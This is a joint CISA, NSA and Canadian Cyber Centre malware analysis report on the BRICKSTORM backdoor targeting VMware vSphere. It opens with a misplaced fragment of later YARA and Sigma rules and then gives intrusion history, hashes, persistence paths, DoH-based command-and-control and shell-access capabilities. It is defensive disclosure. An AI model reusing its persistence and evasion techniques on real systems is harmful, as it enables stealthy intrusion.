\"24a11a26a2586f4fba7bfe89df2e21a0809ad85069e442da98c37c4add369a0c\" \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 29 of 48 TLP:CLEAR \nstrings: \n$s0 = { 2F 00 75 00 73 00 72 00 2F 00 73 00 62 00 69 00 6E 00 2F 00 73 00 71 00 69 00 75 00 \n64 } \n$s1 = { 2F 00 62 00 69 00 6E 00 2F 00 62 00 61 00 73 00 68 } \n$s2 = { 2F 00 63 00 6D 00 64 00 6C 00 69 00 6E 00 65 } \n$s3 = { 2F 00 64 00 65 00 76 00 2F 00 6E 00 75 00 6C } \n$s4 = { 2F 00 65 00 74 00 63 00 2F 00 73 00 61 00 6D 00 62 00 61 00 2F 00 73 00 6D 00 62 } \n$s5 = { 2F 00 70 00 72 00 6F 00 63 00 2F 00 6E 00 65 00 74 00 2F 00 72 00 6F 00 75 00 74 } \n$s6 = { 44 6F 74 4E 65 74 52 75 6E 74 69 6D 65 44 65 62 75 67 48 65 61 64 65 72 } \n$s7 = { 32 35 38 45 41 46 41 35 2D 45 39 31 34 2D 34 37 44 41 2D 39 35 43 41 2D 43 35 41 \n42 30 44 43 38 35 42 31 31 } \n$s8 = { 63 66 73 65 74 6F 73 70 65 65 64 00 63 68 64 69 72 00 63 6C 6F 73 65 00 64 75 70 32 \n} \n$s9 = { 65 78 65 63 76 00 65 78 65 63 76 70 00 66 6F 72 6B 00 66 6F 72 6B 70 74 79 00 6B 69 \n6C 6C } \n$s10 = { 32 31 35 31 30 31 32 31 33 62 35 63 34 35 34 38 61 62 36 63 63 65 38 31 38 35 34 \n61 31 33 65 65 } \ncondition: \n9 of them \n} \nSigma Rule \nDeploy the CISA-created Sigma rule in Table 13 to detect BRICKSTORM. \nNote: This rule can be run in an entity\u2019s security information and event management (SIEM) system, but it \nwill only be useful if the SIEM contains the vCenter logs. Additionally, this detection method will not work if \nrun on endpoint detection and response (EDR) logs. \nTable 13. Sigma Rule \nBRICKSTORM \n                             ## CISA Code & Media Analysis ## \n                            ############ README ############### \n## Edit rules and queries as needed for your hunt and based on your environment. \n## Ensure your EDR/SIEM instance has enough memory to run these AND/OR condition based queries. May \ntake longer to run than conventional Sigma rule query.  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 30 of 48 TLP:CLEAR \n## Do not edit \"logsource-product:\" unless you are editing this rule to meet specific logsources/fields and \nknow your environment. \n## TLP GREEN + Please use local installation of Sigma to convert this rule. \n## TLP CLEAR may convert rules using online converter of choice. \n                            ################################### \ntitle: BRICKSTORM Backdoor Activity r2 \nincident: 251157.r2 \ntlp: CLEAR \nid: 329bec83-54bd-405f-a5ab-ba97ec5e6057 \nstatus: test \ndescription: BRICKSTORM malware is a backdoor with multiple capabilities that threat actors use to set up \npersistence on exploited systems.  \nreferences: \n    - https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign \n    - https://cloud.google.com/blog/topics/threat-intelligence\n",
    "filtered_content": "   \nMalware \nAnalysis \nReport \nThis document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries \nminimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject \nto standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information, see \nTraffic Light Protocol (TLP) Definitions and Usage. \nTLP:CLEAR \nBRICKSTORM Backdoor \nInitial Publication: December 4, 2025 \nU.S. Cybersecurity and Infrastructure Security Agency \nU.S. National Security Agency \nCanadian Centre for Cyber Security \n \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 2 of 48 TLP:CLEAR \nMalware Analysis at a Glance \nMalware Name BRICKSTORM \nOriginal Publication Dec. 4, 2025 \nLast Update Feb. 11, 2026 \nExecutive Summary \nThe Cybersecurity and Infrastructure Security Agency (CISA), National Security \nAgency (NSA), and Canadian Centre for Cyber Security (Cyber Centre) assess \nPeople\u2019s Republic of China (PRC) state-sponsored cyber actors are using \nBRICKSTORM malware for long-term persistence on victim systems. CISA, NSA, \nand Cyber Centre are releasing this Malware Analysis Report to share indicators \nof compromise (IOCs) and detection signatures based off analysis of 12 \nBRICKSTORM samples. CISA, NSA, and Cyber Centre urge organizations to use \nthe IOCs and detection signatures to identify BRICKSTORM malware samples. \nLast Update Description \nCISA, NSA, and Cyber Centre updated this Malware Analysis Report on Feb. 11, \n2026, with analysis, IOCs, and detection signatures from a new variant of \nBRICKSTORM. \nKey Actions \n\u25aa Use the IOCs and detection signatures to identify BRICKSTORM samples. \n\u25aa If BRICKSTORM, similar malware, or potentially related activity is detected, \nreport the incident to CISA, Cyber Centre, or required authorities \nimmediately. \nIndicators of \nCompromise \nFor a downloadable copy of IOCs associated with this malware, see:  \n\u25aa MAR-251165.c1.v1.CLEAR (Dec. 4, 2025) \n\u25aa MAR-2512217.c1.v2.CLEAR (Dec. 19, 2025) \n\u25aa MAR-261234.c1.v1.CLEAR (Feb. 11, 2026) \nDetection \nThis Malware Analysis Report includes YARA and Sigma rules. \nFor a downloadable copy of the Sigma rules associated with this malware, see: \nAR25-338A Sigma YAML. \nIntended Audience \nOrganizations: Government and critical infrastructure organizations. \nRoles: Digital forensics analysts, incident responders, vulnerability analysts, \nsystem administrators. \n  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 3 of 48 TLP:CLEAR \nTable of Contents \nIntroduction ................................................................................................................................................................... 4 \nMalware Summary ....................................................................................................................................................... 5 \nMalware Delivery .......................................................................................................................................................... 5 \nMalware Metadata ....................................................................................................................................................... 6 \nMalware Functionality .............................................................................................................................................. 10 \nDetection .................................................................................................................................................................... 22 \nIncident Response ..................................................................................................................................................... 36 \nMitigations .................................................................................................................................................................. 36 \nDisclaimer ................................................................................................................................................................... 37 \nAcknowledgements ................................................................................................................................................... 37 \nVersion History ........................................................................................................................................................... 37 \nAppendix A: MITRE ATT&CK Techniques ............................................................................................................... 38 \nAppendix B: Scanning Guidance on Remote Hosts ............................................................................................. 40 \nAppendix C: Dec. 19, 2025, Updates ..................................................................................................................... 41 \nAppendix D: Feb. 11, 2026, Updates ..................................................................................................................... 45 \nNotes ........................................................................................................................................................................... 48 \n  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 4 of 48 TLP:CLEAR \nIntroduction \nNote: This Malware Analysis Report was originally published Dec. 4, 2025, to share indicators of \ncompromise (IOCs) and detection signatures for BRICKSTORM malware. The Cybersecurity and \nInfrastructure Security Agency (CISA), National Security Agency (NSA), and Canadian Centre for Cyber \nSecurity (Cyber Centre) have updated this Malware Analysis Report three times. \n\u25aa Dec. 19, 2025, with IOCs and detection signatures for three additional BRICKSTORM samples. See \nAppendix C: Dec. 19, 2025, Updates and Table 12. \n\u25aa Jan. 20, 2026, with detection signatures. See Table 12. \n\u25aa Feb. 11, 2026, with analysis, IOCs, and detection signatures for an additional sample of \nBRICKSTORM. This sample is a different variant than the other samples. See Appendix D: Feb. 11, \n2026, Updates and Table 12. \nCISA, NSA, and Cyber Centre assess People\u2019s Republic of China (PRC) state-sponsored cyber actors are \nusing BRICKSTORM malware for long-term persistence on victim systems. Victim organizations are \nprimarily in the Government Services and Facilities and Information Technology Sectors. BRICKSTORM is a \nsophisticated backdoor for VMware vSphere (specifically VMware vCenter servers,1 VMware ESXI,2 and \nVMware Aria Automation Orchestrator) and Windows environments.3  \nThese cyber actors have been observed targeting VMware vSphere platforms. Once compromised, the \ncyber actors can use their access to the vCenter management console to steal cloned virtual machine (VM) \nsnapshots for credential extraction and create hidden, rogue VMs. See CISA\u2019s Alert PRC State-Sponsored \nAPT Actors Employ BRICKSTORM Malware Across Public Sector and Information Technology. \nCISA analyzed 12 BRICKSTORM samples obtained from victim organizations, including an organization \nwhere CISA conducted an incident response engagement. (CISA initially analyzed eight samples. The Dec. \n19, 2025, update includes analysis of three additional samples and the Feb. 11, 2026, update includes \nanalysis of one sample.) \nAt the victim organization where CISA conducted an incident response engagement, PRC state-sponsored \ncyber actors gained long-term persistent access to the organization\u2019s internal network in April 2024 and \nuploaded BRICKSTORM malware to an internal VMware vCenter server. They also gained access to two \ndomain controllers and an Active Directory Federation Services (ADFS) server. They successfully \ncompromised the ADFS server and exported cryptographic keys. The cyber actors used BRICKSTORM for \npersistent access from at least April 2024 through at least Sep. 3, 2025. \nCISA, NSA, and Cyber Centre urge organizations to use the IOCs and detection signatures in this Malware \nAnalysis Report to identify BRICKSTORM malware samples. If identified, follow the guidance in the Incident \nResponse section. \nFor a downloadable copy of IOCs associated with this malware, see:  \n\u25aa MAR-251165.c1.v1.CLEAR (Dec. 4, 2025) \n\u25aa MAR-2512217.c1.v2.CLEAR (Dec. 19, 2025) \n\u25aa MAR-261234.c1.v1.CLEAR (Feb. 11, 2026) \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 5 of 48 TLP:CLEAR \nFor a downloadable copy of the Sigma rule associated with this malware, see: AR25-338A Sigma YAML. \nFor more information on PRC state-sponsored cyber activity, see CISA\u2019s People\u2019s Republic of China Threat \nOverview and Advisories webpage. \nMalware Summary \nBRICKSTORM is a custom Executable and Linkable Format (ELF) Go- or Rust-based backdoor (eight \noriginally analyzed samples are Go-based, and two of the three new samples in the Dec. 19, 2025, update \nare Rust-based). The analyzed samples differ in function, but all enable cyber actors to maintain stealthy \naccess and provide capabilities for initiation, persistence, and secure command and control (C2). Even \nthough the analyzed samples were for VMware vSphere environments, there is reporting about Windows \nversions. \nBRICKSTORM initiates by running checks and maintains persistence by using a self-watching function and \nautomatically reinstalls or restarts if disrupted. \nFor C2, BRICKSTORM uses multiple layers of encryption (HTTPS, WebSockets, nested Transport Layer \nSecurity [TLS]) to hide its communications with the cyber actors\u2019 C2 server. It also uses DNS-over-HTTPS \n(DoH) and mimics web server functionality to blend its communications with legitimate traffic. For remote \nsystem control, BRICKSTORM gives cyber actors interactive shell access on the system and allows them to \nbrowse, upload, download, create, delete, and manipulate files. In addition, some samples act as a SOCKS \nproxy, facilitating lateral movement and allowing cyber actors to compromise additional systems. \nMalware Delivery \nNote: This advisory uses the MITRE ATT&CK\u00ae Matrix for Enterprise framework, version 18. See Appendix A: \nMITRE ATT&CK Techniques for tables mapping the cyber actors\u2019 activity to MITRE ATT&CK tactics and \ntechniques. \nAt the victim organization where CISA conducted an incident response engagement, PRC state-sponsored \ncyber actors accessed a web server on April 11, 2024. The web server was inside the organization\u2019s \ndemilitarized zone (DMZ), and cyber actors accessed it through a web shell [T1505.003] present on the \nserver. Incident data does not indicate how they obtained initial access to the web server or when the web \nshell was implanted. On the same day, the cyber actors used service account credentials [T1078] to move \nlaterally using Remote Desktop Protocol (RDP) [T1021.001] from the web server to a domain controller in \nthe DMZ, from which they copied the Active Directory (AD) database (ntds.dit) [T1003.003]. \nOn April 12, 2024, the cyber actors moved laterally from the web server to a domain controller within the \ninternal network using RDP and credentials associated with a second service account. It is unknown how \nthey obtained the credentials. Subsequently, they copied the AD database, obtaining credentials for a \nmanaged service provider (MSP) account. Using the MSP credentials, the cyber actors proceeded to move \nfrom the internal domain controller to the VMware vCenter server. \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 6 of 48 TLP:CLEAR \nFrom the web server, the actors also moved laterally using Server Message Block (SMB) to two jump \nservers and an ADFS server, from which they exfiltrated cryptographic keys. See Figure 1 for a diagram of \nthe cyber actors\u2019 movement. \n \nFigure 1. PRC State-Sponsored Cyber Actors\u2019 Lateral Movement \nAfter gaining access to vCenter, the cyber actors elevated privileges using the sudo command \n[T1548.003], dropped BRICKSTORM malware in the server\u2019s /etc/sysconfig/ directory [T1105], and \nmodified the system\u2019s init file in /etc/sysconfig/ to run BRICKSTORM. \nThe modified init file controls the bootup process [T1037] on VMware vSphere systems and executes \nBRICKSTORM. Typically, this file is used to define certain visual variables for the bootup process. After the \nsetting for visual variables, an additional line was added to the script to execute BRICKSTORM from the \nhard-coded file path /etc/sysconfig/. \nNote: CISA is still completing analysis to understand the malicious activity and full impact of the \ncompromise. \nMalware Metadata \nSee Table 1 through Table 8 for metadata of the analyzed malware Samples 1 through 8. See Appendix C: \nDec. 19, 2025, Updates for metadata of Samples 9 through 11 and Appendix D: Feb. 11, 2026, Updates \nfor metadata of Sample 12. \nTable 1. BRICKSTORM Sample 1 \nFile Name vmsrc \nSize 7692288 bytes \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 7 of 48 TLP:CLEAR \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 8e4c88d00b6eb46229a1ed7001451320 \nSHA1 9bf4c786ebd68c0181cfe3eb85d2fd202ed12c54 \nSHA256 aaf5569c8e349c15028bc3fac09eb982efb06eabac955b705a6d447263658e38 \nSHA512 5e654776e9c419e11e6f93a452415a601bd9a2079710f1074608570e498a9af37b81bb\n57c98cb8bb626c5ee4b3e35757d3ae8c1c3717f28d9f3fe7a4cebe0608 \nssdeep 49152:9lDeYNeYunc1S3/U05q+CIKUbwgBfd1Vww/uUJSZina/TokDDko0n8oQhEoAgsUJ:O3l\ncE380sIDbdB11p3i/TokEIowlb/r \nEntropy 5.993799 \nTable 2. BRICKSTORM Sample 2 \nFile Name vnetd \nSize 26603668 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 39111508bfde89ce6e0fe6abe0365552 \nSHA1 f639d9404c03af86ce452db5c5e0c528b81dc0d7 \nSHA256 013211c56caaa697914b5b5871e4998d0298902e336e373ebb27b7db30917eaf \nSHA512 74b4c6f7c7cae07c6f8edf3f2fb1e9206d4f1f9734e8e4784b15d192eec8cd8a4f59078fc0\nc56dc4ad0856cdd792337b5c92ffd3d2240c8a287a776df4363bba \nssdeep 196608:GbkKsdDjru3WUIOsW5SYVRk/Qvk1LzK3RMxy2wBW:GwKMjr3Os4k/QiLzERMMdW \nEntropy 6.211446 \nTable 3. BRICKSTORM Sample 3 \nFile Name if-up \nSize 15511700 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 8 of 48 TLP:CLEAR \nMD5 dbca28ad420408850a94d5c325183b28 \nSHA1 fb11c6caa4ea844942fe97f46d7eb42bc76911ab \nSHA256 57bd98dbb5a00e54f07ffacda1fea91451a0c0b532cd7d570e98ce2ff741c21d \nSHA512 659205fa2cfa85e484c091cc2e85a7ec4e332b196e423b1f39bafdc8fca33e3db712bbe07\nafcc091ff26d9b4f641fa9a73f2a66dce9a0ced54ebeb8c2be82a7f \nssdeep 98304:dzB06b0KX4Mnb+sJf+AjBzH3MF4m1d4U2TuAJ5VGY3glknTSk2nH:dFQKIsJBBzXMu\nm83RJ5VGY3gS2nH \nEntropy 6.102490 \nTable 4. BRICKSTORM Sample 4 \nFile Name viocli \nSize 6311936 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 0a4fa52803a389311a9ddc49b7b19138 \nSHA1 97001baaa379bcd83677dca7bc5b8048fdfaaddc \nSHA256 b3b6a992540da96375e4781afd3052118ad97cfe60ccf004d732f76678f6820a \nSHA512 65ebf5dfafb8972ffead44271436ec842517cfaaf3d1f1f1237a32d66e1d280943bd3a69f1\nd539a1b7aca6152e96b29bc822e1047e2243f6aec8959595560147 \nssdeep 49152:BgClz8/9cMSThwhWyh/zypzOzRzqm9hRp6FY+fAn/bkNqr+HfHF2xkdpb3gAiDli:W08/\n9I6WMzUcRz9zvn//Z5D \nEntropy 6.005898 \nTable 5. BRICKSTORM Sample 5 \nFile Name vts \nSize 6303744 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 82bf31e7d768e6d4d3bc7c8c8ef2b358 \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 9 of 48 TLP:CLEAR \nSHA1 de28546ec356c566cd8bca205101a733e9a4a22d \nSHA256 22c15a32b69116a46eb5d0f2b228cc37cd1b5915a91ec8f38df79d3eed1da26b \nSHA512 4c52caf2e5f114103ed5f60c6add3aa26c741b07869bb66e3c25a1dc290d4a8bf87c42c3\n36e8ac8ebf82d9a9b23eaa18c31f7051a5970a8fe1125a2da890340f \nssdeep 49152:uP9kPWdmrJl+9zxKsSJ32ssUZGHZ9ECKDfvCb3XKRbaYJcRHMH9xkdgY3gqF2HxR:yq\nWdmd4x5SgssUZ0OCKDfvChYrRq \nEntropy 6.005438 \nTable 6. BRICKSTORM Sample 6 \nFile Name vmckd \nSize 6311936 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 18f895e24fe1181bb559215ff9cf6ce3 \nSHA1 c3549d4e5e39a11f609fc6fbf5cc1f2c0ec272b4 \nSHA256 f7cda90174b806a34381d5043e89b23ba826abcc89f7abd520060a64475ed506 \nSHA512 79276523a6a507e3fa1b12b96e09b10a01c783a53d58b9ae7f5780a379431639a8016\n5e81154522649b8e2098e86d1a310efffebe32faafc7b3bc093eec60a64 \nssdeep 49152:6XUQ9anktEg7z/QbPB83A+FQGQzqufqCjt2F81jh+eS53OOwJylHJHuxkdqz3gHG:mVa\nnkxn2Pe3JQGQz57t2Y4f3TwrQHAz \nEntropy 6.005752 \nTable 7. BRICKSTORM Sample 7 \nSize 8332689 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 a52e36a70b5e0307cbcaa5fd7c97882c \nSHA1 44a3d3f15ef75d9294345462e1b82272b0d11985 \nSHA256 39b3d8a8aedffc1b40820f205f6a4dc041cd37262880e5030b008175c45b0c46 \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 10 of 48 TLP:CLEAR \nSHA512 bbe18d32bef66ccfa931468511e8ba55b32943e47a1df1e68bb5c8f8ae97a5bf99120185\n8ae9632fa24df5f6c674b6cb260297a1c11889ca61bda68513f440ce \nssdeep 98304:78Se5lqfYMKDdopPx0E4j+dM/GLaCXNwqYL6wt/5APUnb:78Se54fYMUaiE4j+dM/GL\naCXNmLP+ \nEntropy 6.063930 \nTable 8. BRICKSTORM Sample 8 \nSize 8332689 bytes \nType ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \nMD5 a02469742f7b0bc9a8ab5e26822b3fa8 \nSHA1 10d811029f6e5f58cd06143d6353d3b05bc06d0f \nSHA256 73fe8b8fb4bd7776362fd356fdc189c93cf5d9f6724f6237d829024c10263fe5 \nSHA512 8e29aeb3603ffe307b2d60f7401bd9978bebe8883235eb88052ebf6b9e04ce6bf356674\n80cedea5712c1e13e8c6dcfb34d5fde0ddca6ca31328de0152509bf8f \nssdeep 98304:78Se5lqfYMKDdopPx0E4j+dM/GLaCXNwqYL6wt/5APUnU:78Se54fYMUaiE4j+dM/GL\naCXNmLP+ \nEntropy 6.063928 \nMalware Functionality \nNote: This analysis is of Samples 1 through 8. See Appendix C: Dec. 19, 2025, Updates for functionality of \nSamples 9 through 11. \nAll analyzed samples enable cyber actors to maintain stealthy access and provide capabilities for \nenvironment configuration (initiation), persistence, and secure C2. While initiation and persistence \nfunctions are similar across the samples, the secure C2 function varies. BRICKSTORM uses custom \nhandlers to set up a SOCKS proxy, create a web server on the compromised system, and execute \ncommands on the compromised system. \nSamples 7 and 8 were designed to work in virtualized environments, using a virtual socket (VSOCK) \ninterface to enable inter-VM communication, facilitate data exfiltration, and maintain persistence. \nMost samples used Exclusive OR (XOR) cipher encryption to hide key strings, such as the Internet Protocol \nversion 4 (IPv4) addresses of public DoH servers, within their code. \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 11 of 48 TLP:CLEAR \nInitiation Capabilities \nUpon execution, BRICKSTORM runs checks and can reinstall and restart itself to maintain persistence. \nBRICKSTORM initiates a function (referred to as main_startNew in some samples) to configure \nenvironment variables specific to the compromised environment, enabling it to operate effectively. \nFollowing this, BRICKSTORM identifies if it is already in its intended state and proceeds to continue \nrunning, copy itself for execution, or terminate based on the following logic: \n1. Environment Variable Check: BRICKSTORM checks a specified environment variable (differs by \nsample; see Table 9) to determine if it is running as a child process (to identify if it is running in its \nintended state). \na. If the specified variable is set, indicating it is running as a child process, BRICKSTORM \ncontinues its code execution. \nb. If the specified variable is not set (indicating it is not running as a child process), BRICKSTORM \nchecks whether it is executing from /etc/sysconfig/ (Samples 1 through 2 and 4 through 7) \nor /etc/sysconfig/network/ (Sample 3) by attempting to load file contents from that path. \n2. File Path Validation and Copying: If BRICKSTORM is running from the validated path, it copies itself \nto a specific location with a specific file name. \nc. Next, the parent BRICKSTORM instance modifies the PATH environment variable by appending \nthe copied location\u2019s path [T1574.007]. This ensures the newly copied version of BRICKSTORM \nwill be executed first if any commands or processes attempt to run VMware vSphere. \nd. The parent instance subsequently executes the copied instance of BRICKSTORM with the \nspecified variable set in the context of the child process and terminates its own execution. \n3. Termination: If BRICKSTORM is not running from the validated path, it terminates its own \nexecution. \nSee Figure 2 for the operational flow of the malware. \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 12 of 48 TLP:CLEAR \n \nFigure 2. BRICKSTORM Operational Flow, Malware Initiation \nSee Table 9 for checked variables, copied locations, and copied file names of the analyzed samples. \nTable 9. BRICKSTORM Initiation Checks and Copied File Information \nSample \nChecked Environment Variable \nto Determine if Running as a \nChild Process \nCopied Location Copied File Name \nSample 1 VMware [T1036] /opt/vmware/sbin vmware-sphere \nSample 2 [redacted]ET4 /usr/java/jre-vmware/bin/ updatemgr \nSample 3 CZePMeGj etc/applmgmt/appliance/ vami \nSample 4 [redacted]NET6 /usr/java/jre-vmware/bin/ updatemgr \nSample 5 FIOON /usr/java/jre-vmware/bin/ updatemgr \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 13 of 48 TLP:CLEAR \nSample \nChecked Environment Variable \nto Determine if Running as a \nChild Process \nCopied Location Copied File Name \nSample 6 [redacted]NET4 /usr/java/jre-vmware/bin/ updatemgr \nSample 7 VREG   \nSample 8 VARGS   \nPersistence Capabilities \nTo ensure its continued operations, BRICKSTORM uses built-in self-monitoring and persistence capabilities \nwhile running. Specifically, it has a built-in self-watching function (referred to as main_selfWatcher in \nsome samples) to maintain persistence. This function monitors if BRICKSTORM is running correctly and, if \nnot, BRICKSTORM reinstalls and executes itself, mirroring its initiation capabilities. \nThe self-watching function begins by checking a specific environment variable (see Table 10) to confirm \nwhether BRICKSTORM is running as an active process. If the check returns a false value (indicating the \nvariable is not set), BRICKSTORM assumes it is not running properly. In response, BRICKSTORM re-installs \nitself from predefined file path\u2014/etc/sysconfig/ (Samples 1 through 2 and 4 through 8) or \n/etc/sysconfig/network/ (Sample 3)\u2014to a new location (the file name of the new BRICKSTORM \ninstance and location copied varies by sample; see Table 10). BRICKSTORM then updates the PATH \nenvironment variable to include the new file location, ensuring the newly copied backdoor file is executed \nfirst. Subsequently, the parent instance terminates its own execution, allowing the new process to take \nover. \nIf the initial checks confirm that BRICKSTORM is running as intended (the variable is set), the self-watcher \nfunction allows the code to continue its operations. \nSee Table 10 for details on checked variables, processes, copied locations, and file names associated with \nthe analyzed samples. \nTable 10. BRICKSTORM Checked Variables, Processes, and Copied Names and Locations \nSample Checked \nEnvironment Variable \nChecked Process \nExistence \nCopies To Newly Copied \nFile Name \nSample 1 Sphere vmware-sphere /opt/vmware/sbin/ vmware-\nsphere \nSample 2 [redacted]NET3 vnetd /usr/java/jre-vmware/bin/ updatemgr \nSample 3 rcMJVF vami /etc/applmgmt/appliance/ vami \nSample 4 [redacted]NET5 updatemgr /usr/java/jre-vmware/bin/ updatemgr \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 14 of 48 TLP:CLEAR \nSample Checked \nEnvironment Variable \nChecked Process \nExistence \nCopies To Newly Copied \nFile Name \nSample 5 DIGNN updatemgr /usr/java/jre-vmware/bin/ updatemgr \nSample 6 [redacted]NET3 updatemgr /usr/java/jre-vmware/ updatemgr \nSample 7 VREG    \nSample 8 VARGS    \nSecure Command and Control \nAfter passing initiation checks, BRICKSTORM establishes a connection to a C2 server, secures \ncommunications with the server, and enables cyber actors\u2019 full control over the compromised system. This \ncontrol includes capabilities such as file system management and interactive shell access. In most \nsamples, BRICKSTORM also provides a SOCKS proxy to facilitate tunneling and lateral movement. \nThe implementation of these capabilities varies across samples, with notable differences in Samples 7 and \n8, which specifically target virtualized environments. \nSample 1 \nInitial Connection to the C2 Server: Sample 1 first creates an encrypted Domain Name System (DNS) query \nfor a hard-coded C2 domain (the domain has been redacted from this report because according to public \nreporting, the cyber threat actors are not reusing C2 domains).4 The sample uses DoH to resolve the \naddress of its C2 servers by sending an encrypted HTTPS request to one of the following legitimate public \nDoH resolvers [T1071.001]: \n\u25aa https[:]//1.0.0[.]1/dns-query (Cloudflare) \n\u25aa https[:]//1.1.1[.]1/dns-query (Cloudflare) \n\u25aa https[:]//8.8.4[.]4/dns-query (Google) \n\u25aa https[:]//8.8.8[.]8/dns-query (Google) \n\u25aa https[:]//9.9.9[.]9/dns-query (Quad9) \nIf the C2 domain is not found in the public DoH resolver cache, the legitimate resolver forwards the request \nto the next server in the DNS hierarchy, ultimately reaching the threat actors\u2019 DNS server. The DNS server \nresponds with the correct IP address for the domain. The response is sent back through the legitimate DoH \nresolver to BRICKSTORM, which receives the encrypted response, decrypts it to get the C2 server\u2019s IP \naddress, and establishes a connection. \nEstablishing Secure Communications: Sample 1 establishes an encrypted connection to the C2 server \nusing HTTPS, then upgrades the session to WebSockets with an additional layer of TLS encryption. To do \nthis, Sample 1 first communicates over HTTPS with a specific legitimate cloud platform (redacted). The \nsample then sends an HTTP upgrade request to convert the initial encrypted HTTPS connection into a \npersistent WebSocket connection: wss://[REDACTED].com/api. Sample 1 nests additional layers of TLS \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 15 of 48 TLP:CLEAR \nencryption within the WebSocket session and performs a series of nested TLS handshakes within the \nestablished WebSocket tunnel. The first handshake is the standard TLS handshake for the initial HTTPS \nrequest to the cloud platform. The second TLS handshake occurs within the WebSocket tunnel, during \nwhich BRICKSTORM authenticates itself to the C2 server using a hard-coded key. \nUpon successful authentication, BRICKSTORM establishes a multiplexing layer, which allows it to send \nmultiple commands and data streams over the same connection. It does this using both Simple \nMultiplexing (smux) and Yet Another Multiplexer (Yamux) libraries to create virtual streams over a single \nunderlying TLS-secured connection based on client configuration or handshake data. Multiplexing conceals \nthreat actor activity by embedding multiple commands and network tunnels within a single encrypted \nstream. \nSee Figure 3 for the applicable decompiler output. \n \nFigure 3. BRICKSTORM Decompiler Output for Establishing Secure Connections \n  \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 16 of 48 TLP:CLEAR \nFull System Control: Once the secure connection to the C2 domain is established, Sample 1 uses a custom \nGo package wssoft2 to manage incoming network connections and to process commands it receives. \nCommands are directed to one of three handlers based on the function it needs: SOCKS Handler, Web \nService Handler, and Command Handler. \nThe SOCKS Handler sets up a SOCKS proxy [T1090.001] to route C2 traffic and facilitate lateral movement \nwithin the victim network. To set up the proxy, the handler parses JSON requests from the C2 server. If the \nrequest is valid, the handler delegates request handling to \nwssoft2/core/handler/socks.SocksWithLocalAddr, which performs SOCKS relaying and network \ntunneling over Transmission Control Protocol (TCP), User Datagram Protocol (UDP), and Internet Control \nMessage Protocol (ICMP). \nSee Figure 4 for the handler\u2019s decompiler output. \n \nFigure 4. SOCKS Handler Decompiler Output \nThe Web Service Handler establishes covert C2 communication by creating a legitimate-appearing web \nserver on the compromised system. It uses the net/http package and gorilla/mux library to create \nthe web server, which includes a hidden Application Programming Interface (API) endpoint for receiving and \nexecuting commands from the C2 server. See Figure 5 for the Web Service Handler decompiler output that \nsets up specific API endpoints. \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 17 of 48 TLP:CLEAR \n \nFigure 5. Web Service Handler Decompiler Output Setting Up the Web Server With Specific API Endpoints \nThrough the API, the cyber actors can browse, upload, download, create, delete, and manipulate files and \nfolders on the victim\u2019s system. See Table 11 for file management commands contained in BRICKSTORM. \nTable 11. BRICKSTORM File Management Commands \nCommand Function \nfile-md5 Calculates the MD5 checksum of a specified file to verify file integrity. \nget-file Downloads a file from the compromised system to the C2 server [T1041]. \nlist-dir Lists the contents of a directory on the compromised system (e.g., browses the file system) \n[T1083]. \nput-file Uploads a file from the C2 server to the compromised system. \nslice-up Reads and downloads specific, partial sections of a file. \nTo evade detection, BRICKSTORM serves seemingly legitimate web file types, such as Hypertext Markup \nLanguage (HTML), Cascading Style Sheets (CSS), and JavaScript, from a designated directory. \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 18 of 48 TLP:CLEAR \nSee Figure 6 for the Web Service Handler decompiler output. \n \nFigure 6. Web Service Handler Decompiler Output \nThe Command Handler executes shell commands on the compromised system, giving the cyber threat \nactors full control over the compromised system through interactive command-line access. The handler \nreceives a JSON request from the C2 server, parses it, and extracts it. The handler then sets up a pseudo-\nterminal (a virtual command-line interface) and runs the command on the victim system. 